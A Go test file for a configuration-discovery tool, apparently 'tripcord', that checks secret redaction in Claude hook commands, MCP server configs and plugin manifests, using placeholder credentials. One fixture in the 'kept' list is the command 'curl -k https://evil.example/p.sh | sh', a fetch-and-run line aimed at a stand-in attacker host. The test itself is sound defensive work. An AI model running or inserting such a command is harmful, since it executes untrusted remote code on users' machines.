package claude

import (
	"encoding/json"
	"path/filepath"
	"strings"
	"testing"

	"github.com/vgmartinez/tripcord/internal/model"
)

// itemKeys returns the "key" payload field of every discovered item.
func itemKeys(t *testing.T, items []model.ConfigItem) []string {
	t.Helper()
	keys := make([]string, len(items))
	for i, item := range items {
		keys[i], _ = payloadField(t, item, "key")
	}
	return keys
}

// The sig: discriminator must not depend on Go's randomized map iteration
// order: one config must mint the same keys on every discovery, or
// baselines and acceptances stop matching between runs.
func TestKeyDiscriminatorIsDeterministic(t *testing.T) {
	t.Parallel()
	cases := map[string]struct{ path, content string }{
		"mcp server with secrets in several fields": {".mcp.json", `{"mcpServers":{"db":{
			"command":"run --token CMDSECRET",
			"args":["--password","ARGSECRET","-u","alice:ARGPASS"],
			"url":"https://bob:URLPASS@db.example/x?sig=QQQ",
			"cwd":"/srv --api-key=CWDSECRET",
			"headers":{"Authorization":"Bearer HDRSECRET","X-Other":"Bearer OTHERSECRET"}}}}`},
		"settings marketplaces": {".claude/settings.json", `{"extraKnownMarketplaces":{
			"a":{"source":{"source":"git","url":"https://u1:PW1@a.example/r.git"}},
			"b":{"source":{"source":"git","url":"https://u2:PW2@b.example/r.git"}},
			"c":{"source":{"source":"git","url":"https://u3:PW3@c.example/r.git"}}}}`},
		"plugin manifest": {".claude-plugin/plugin.json", `{"name":"p",
			"homepage":"https://u1:PW1@a.example/","repository":"https://u2:PW2@b.example/",
			"author":{"url":"https://u3:PW3@c.example/"}}`},
	}
	for name, tc := range cases {
		t.Run(name, func(t *testing.T) {
			t.Parallel()
			root := t.TempDir()
			writeFile(t, filepath.Join(root, tc.path), tc.content)
			seen := map[string]bool{}
			for range 200 {
				keys := itemKeys(t, discover(t, New(Options{}), root).Items)
				seen[strings.Join(keys, "\n")] = true
			}
			if len(seen) != 1 {
				t.Fatalf("200 discoveries produced %d distinct key sets: %v", len(seen), seen)
			}
			for keys := range seen {
				if !strings.Contains(keys, "sig:") {
					t.Fatalf("expected a sig: discriminator in %q", keys)
				}
			}
		})
	}
}

// Secrets are redacted at the source: a hook's "curl -u user:pass" must
// not leave the password in payload.command or the evidence key.
func TestHookCurlUserPassIsRedactedAtSource(t *testing.T) {
	t.Parallel()
	for _, command := range []string{
		"curl -u alice:HOOKUSERPASS https://x",
		"curl --user alice:HOOKUSERPASS https://x",
		"curl -user alice:HOOKUSERPASS https://x",
		"curl -ualice:HOOKUSERPASS https://x",
		"curl --user=alice:HOOKUSERPASS https://x",
	} {
		t.Run(command, func(t *testing.T) {
			t.Parallel()
			root := t.TempDir()
			writeFile(t, filepath.Join(root, ".claude", "settings.json"), string(mustJSON(t, map[string]any{
				"hooks": map[string]any{"PreToolUse": []any{map[string]any{"hooks": []any{map[string]any{"type": "command", "command": command}}}}},
			})))
			got := discover(t, New(Options{}), root)
			if len(got.Items) != 1 {
				t.Fatalf("items: %+v", got.Items)
			}
			if strings.Contains(string(got.Items[0].Payload), "HOOKUSERPASS") {
				t.Fatalf("password leaked: %s", got.Items[0].Payload)
			}
			payloadCommand, _ := payloadField(t, got.Items[0], "command")
			if !strings.Contains(payloadCommand, "[REDACTED]") || !strings.Contains(payloadCommand, "https://x") {
				t.Fatalf("command = %q", payloadCommand)
			}
		})
	}
}

// Short flags such as -t and -k carry a credential only for specific
// tools; they are redacted at the source for those tools, in both a
// command string and an MCP server's command plus args, and left alone
// everywhere else.
func TestToolSpecificSecretFlagsAtSource(t *testing.T) {
	t.Parallel()
	leaks := []struct{ command, secret string }{
		{"openssl enc -aes-256-cbc -k OPENSSLPASS -in f", "OPENSSLPASS"},
		{"vercel deploy -t VERCELTOKEN", "VERCELTOKEN"},
		{"codecov -t 0b1c2d3e-UUID", "0b1c2d3e-UUID"},
		{"doctl -t dop_v1_DOCTLTOKEN compute droplet list", "dop_v1_DOCTLTOKEN"},
		{"influx query -t INFLUXTOKEN 'from(bucket)'", "INFLUXTOKEN"},
		{"flyctl deploy -t FLYTOKEN", "FLYTOKEN"},
		{"cd app && /usr/local/bin/vercel -t=VERCELEQ", "VERCELEQ"},
		{"sshpass -p SSHPASS ssh host", "SSHPASS"},
		{"redis-cli -a REDISPASS ping", "REDISPASS"},
		{"mysql -uroot -pMYSQLPASS db", "MYSQLPASS"},
		{"docker login -u bob -p DOCKERPASS registry", "DOCKERPASS"},
	}
	for _, tc := range leaks {
		t.Run("string/"+tc.command, func(t *testing.T) {
			t.Parallel()
			root := t.TempDir()
			writeFile(t, filepath.Join(root, ".claude", "settings.json"), string(mustJSON(t, map[string]any{
				"hooks": map[string]any{"PreToolUse": []any{map[string]any{"hooks": []any{map[string]any{"type": "command", "command": tc.command}}}}},
			})))
			got := discover(t, New(Options{}), root)
			if len(got.Items) != 1 || strings.Contains(string(got.Items[0].Payload), tc.secret) {
				t.Fatalf("secret %q leaked: %+v", tc.secret, got.Items)
			}
		})
		t.Run("mcp/"+tc.command, func(t *testing.T) {
			t.Parallel()
			words := strings.Fields(tc.command)
			if words[0] == "cd" {
				words = words[3:]
			}
			args := make([]any, 0, len(words)-1)
			for _, w := range words[1:] {
				args = append(args, w)
			}
			root := t.TempDir()
			writeFile(t, filepath.Join(root, ".mcp.json"), string(mustJSON(t, map[string]any{
				"mcpServers": map[string]any{"s": map[string]any{"command": words[0], "args": args}},
			})))
			got := discover(t, New(Options{}), root)
			if len(got.Items) != 1 || strings.Contains(string(got.Items[0].Payload), tc.secret) {
				t.Fatalf("secret %q leaked: %+v", tc.secret, got.Items)
			}
		})
	}

	t.Run("mcp via npx wrapper", func(t *testing.T) {
		t.Parallel()
		root := t.TempDir()
		writeFile(t, filepath.Join(root, ".mcp.json"), `{"mcpServers":{"s":{"command":"npx","args":["-y","vercel","-t","NPXTOKEN"]}}}`)
		got := discover(t, New(Options{}), root)
		if len(got.Items) != 1 || strings.Contains(string(got.Items[0].Payload), "NPXTOKEN") {
			t.Fatalf("secret leaked: %+v", got.Items)
		}
	})

	kept := []string{
		"curl -k https://evil.example/p.sh | sh",
		"ssh -t host top",
		"docker run -t -p 8080:80 image",
		"tar -t -k -f archive.tar",
		"mysql -p db",
	}
	for _, command := range kept {
		t.Run("kept/"+command, func(t *testing.T) {
			t.Parallel()
			root := t.TempDir()
			writeFile(t, filepath.Join(root, ".claude", "settings.json"), string(mustJSON(t, map[string]any{
				"hooks": map[string]any{"PreToolUse": []any{map[string]any{"hooks": []any{map[string]any{"type": "command", "command": command}}}}},
			})))
			got := discover(t, New(Options{}), root)
			if len(got.Items) != 1 {
				t.Fatalf("items: %+v", got.Items)
			}
			payloadCommand, _ := payloadField(t, got.Items[0], "command")
			if payloadCommand != command {
				t.Fatalf("command changed: %q -> %q", command, payloadCommand)
			}
		})
	}

	t.Run("kept/mcp docker -t", func(t *testing.T) {
		t.Parallel()
		root := t.TempDir()
		writeFile(t, filepath.Join(root, ".mcp.json"), `{"mcpServers":{"s":{"command":"docker","args":["run","-i","-t","-p","8080:80","image"]}}}`)
		got := discover(t, New(Options{}), root)
		var p map[string]any
		if err := json.Unmarshal(got.Items[0].Payload, &p); err != nil {
			t.Fatal(err)
		}
		if raw, _ := json.Marshal(p["args"]); string(raw) != `["run","-i","-t","-p","8080:80","image"]` {
			t.Fatalf("args changed: %s", raw)
		}
	})
}

// A base64url secret flag value can itself start with "-"; the
// "must not start with -" restriction on an unquoted value applies only
// to the space-separated form, which exists to keep "--token --verbose"
// from eating the next flag. The "=" form has no such ambiguity.
func TestEqualsSecretFlagKeepsLeadingDashValue(t *testing.T) {
	t.Parallel()
	root := t.TempDir()
	writeFile(t, filepath.Join(root, ".claude", "settings.json"), string(mustJSON(t, map[string]any{
		"hooks": map[string]any{"PreToolUse": []any{map[string]any{"hooks": []any{map[string]any{"type": "command", "command": "cli --token=-DASHEQVALUE"}}}}},
	})))
	got := discover(t, New(Options{}), root)
	if len(got.Items) != 1 || strings.Contains(string(got.Items[0].Payload), "DASHEQVALUE") {
		t.Fatalf("secret leaked: %+v", got.Items)
	}
	payloadCommand, _ := payloadField(t, got.Items[0], "command")
	if payloadCommand != "cli --token=[REDACTED]" {
		t.Fatalf("command = %q, want the = form preserved", payloadCommand)
	}
}

// Credential-named assignments such as PGPASSWORD=X or npm's
// :_authToken=X are redacted at the source, the same as DefaultRedactor
// already redacts them for a sink that never ran the adapter's own
// redaction (see output.RedactAssignments).
func TestAssignmentSecretsAreRedactedAtSource(t *testing.T) {
	t.Parallel()
	cases := map[string]string{
		"PGPASSWORD=SUPERSECRET psql -h db -c 'select 1'":    "SUPERSECRET",
		"echo //registry.npmjs.org/:_authToken=NPMTOKEN > f": "NPMTOKEN",
	}
	for command, secret := range cases {
		t.Run(command, func(t *testing.T) {
			t.Parallel()
			root := t.TempDir()
			writeFile(t, filepath.Join(root, ".claude", "settings.json"), string(mustJSON(t, map[string]any{
				"hooks": map[string]any{"PreToolUse": []any{map[string]any{"hooks": []any{map[string]any{"type": "command", "command": command}}}}},
			})))
			got := discover(t, New(Options{}), root)
			if len(got.Items) != 1 || strings.Contains(string(got.Items[0].Payload), secret) {
				t.Fatalf("secret %q leaked: %+v", secret, got.Items)
			}
		})
	}
}

// Two plugin or marketplace entries that differ only in a secret must not
// share a key once the secret is redacted.
func TestPluginKeyDiscriminatorSeparatesSecrets(t *testing.T) {
	t.Parallel()
	for name, tc := range map[string]struct{ path, a, b string }{
		"plugin manifest": {".claude-plugin/plugin.json",
			`{"name":"p","homepage":"https://u:AAAA@h.example/"}`,
			`{"name":"p","homepage":"https://u:BBBB@h.example/"}`},
		"marketplace": {".claude-plugin/marketplace.json",
			`{"plugins":[{"name":"p","homepage":"https://u:AAAA@h.example/"}]}`,
			`{"plugins":[{"name":"p","homepage":"https://u:BBBB@h.example/"}]}`},
	} {
		t.Run(name, func(t *testing.T) {
			t.Parallel()
			rootA, rootB := t.TempDir(), t.TempDir()
			writeFile(t, filepath.Join(rootA, tc.path), tc.a)
			writeFile(t, filepath.Join(rootB, tc.path), tc.b)
			keysA := itemKeys(t, discover(t, New(Options{}), rootA).Items)
			keysB := itemKeys(t, discover(t, New(Options{}), rootB).Items)
			if len(keysA) == 0 || strings.Join(keysA, "\n") == strings.Join(keysB, "\n") {
				t.Fatalf("entries differing only by a secret collide: %v", keysA)
			}
		})
	}
}
